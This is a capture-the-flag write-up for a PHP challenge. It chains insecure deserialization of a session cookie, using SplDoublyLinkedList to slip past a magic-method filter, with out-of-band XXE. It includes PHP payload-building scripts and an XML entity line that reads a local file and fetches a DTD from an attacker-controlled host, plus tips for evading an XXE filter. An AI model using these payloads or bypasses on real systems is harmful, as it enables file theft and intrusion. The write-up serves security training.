## WAFfle-y Order - Medium (PHP)

After downloading the necessary files for the challenge you will see the following tree
```
 - assets ( JS and CSS Files useless )
 - controllers ( Our Back-end )
 - models ( Our Object Definitions )
 - views ( Our pages / routes)
 index.php
 Router.php
```
When looking at PHP files we start with the Controllers since it is the back-end

**OrderController.php**
```php
<?php
function safe_object($serialized_data)
{
    $matches = [];
    $num_matches = preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $serialized_data, $matches);

    for ($i = 0; $i < $num_matches; $i++) {
        $methods = get_class_methods($matches[2][$i]);
        foreach ($methods as $method) {
            if (preg_match('/^__.*$/', $method) != 0) {
                die("Unsafe method: ${method}");
            }
        }
    }
}

class OrderController
{
    public function order($router)
    {
        $body = file_get_contents('php://input');
        $cookie = base64_decode($_COOKIE['PHPSESSID']);
        safe_object($cookie);
        $user = unserialize($cookie); // unserialize a user-controlled string <- Our Injection Point

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')
        {
            $order = json_decode($body);
            if (!$order->food) 
                return json_encode([
                    'status' => 'danger',
                    'message' => 'You need to select a food option first'
                ]);
            if ($_ENV['debug'])
            {
                $date = date('d-m-Y G:i:s');
                file_put_contents('/tmp/orders.log', "[${date}] ${body} by {$user->username}\n", FILE_APPEND);
            }
            return json_encode([
                'status' => 'success',
                'message' => "Hello {$user->username}, your {$order->food} order has been submitted successfully."
            ]);
        }
        else
        {
            return $router->abort(400);
        }
    }
}
```

By decoding `PHPSESSID` cookie we get `O:9:"UserModel":1:{s:8:"username";s:10:"guest_618a";}` so you've guessed it already we are trying to look for Insecure Deserialization
start building your payload i won't explain how insecure deserialization works look it up.

![image](https://user-images.githubusercontent.com/32434709/140926451-397c2998-103d-43c4-8013-6b09e222c0a7.png)

So you've already got stuck so let's check out the filters
```php
<?php
function safe_object($serialized_data)
{
    $matches = [];
    $num_matches = preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $serialized_data, $matches);

    for ($i = 0; $i < $num_matches; $i++) {
        $methods = get_class_methods($matches[2][$i]);
        foreach ($methods as $method) {
            if (preg_match('/^__.*$/', $method) != 0) {
                die("Unsafe method: ${method}");
            }
        }
    }
}
```
The `safe_object` function checks out your Serialized Object using Regex 
which validates the classes you are using like `O:9:"UserModel";O:14:"XMLParserModel"` and runs a `get_class_methods` function on each Class to check if it has a magic method.
Since Insecure Deserialization needs a Magic method ( starts with `__` ) we need to bypass this filter but how?

![image](https://user-images.githubusercontent.com/32434709/140927560-29a435b1-7b34-4872-abe7-bd1a4aa3cd8b.png)

We need PHP classes implementing `Serializable` interface which in our challenge here our most important class is `SplDoublyLinkedList`

**C code of how SplDoublyLinkedList handles serialization**
```c
    /* flags */
    ZVAL_LONG(&flags, intern->flags);
    php_var_serialize(&buf, &flags, &var_hash);

    /* elements */
    while (current) {
        smart_str_appendc(&buf, ':');
        next = current->next;

        php_var_serialize(&buf, &current->data, &var_hash);

        current = next;
    }
```
After building your payload it will be something like this
```php
<?php
class XmlParserModel
{
    public $data;
    public $env;
}
class UserModel
{
    public $username;
    public $dll;
}

$tp = new XmlParserModel();
$tp->data = ''; // XXE Code
$tp->env = [];

$omar = new UserModel;
$omar->username = "omar";
$omar->dll = new SplDoublyLinkedList();
$omar->dll->push($tp);

echo base64_encode(serialize($omar));
```
```xml
<!ENTITY flag SYSTEM "file:///flag"><!ENTITY % dtd SYSTEM "http://myvps/exploit.dtd" >
```
Run the challenge locally to check out the errors, after being able to run XMLParserModel and bypassing the `safe_object` function we hit another error
`Unsafe XML`. Hmmm let's search for that in our source code
```php
if (preg_match_all("/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im", $this->data))
{
  die('Unsafe XML');
}
```
This regex searches for XXE Payloads so you can't just read the flag and send it to your server so how can we bypass that, wait did you know we can use HTML Entities in XML? 
let's try it out then
```php
<?php
class XmlParserModel
{
    public $data;
    public $env;
}
class UserModel
{
    public $username;
    public $dll;
}

$tp = new XmlParserModel();
$tp->data = ''; // XXE Code try encoding it yourself simple OOB XXE with ENTITY encoded
$tp->env = [];

$omar = new UserModel;
$omar->username = "omar";
$omar->dll = new SplDoublyLinkedList();
$omar->dll->push($tp);

echo base64_encode(serialize($omar));
```
and thats it bypassing 2 filters and chaining insecure deserialization with XXE simple but time consuming.
